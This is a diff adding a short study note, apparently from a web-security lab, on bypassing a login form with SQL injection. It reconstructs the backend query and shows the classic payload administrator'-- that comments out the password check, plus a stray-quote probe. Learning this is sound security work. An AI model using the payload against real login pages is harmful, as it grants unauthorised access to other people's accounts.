@@ -1,0 +1,14 @@
+SQL injection -Login functionality 
+
+End Goal : perform SQLi attack log in  as the administrator user.
+
+Analysis:
+---------------
+
+Select FirstName from USER where username = 'admin' and password ='admin'
+
+Select FirstName from USER where username = ''' and password ='admin'
+
+Select FirstName from USER where username = 'administrator'--' and password ='admin'
+
+Select FirstName from USER where username = 'admin' 
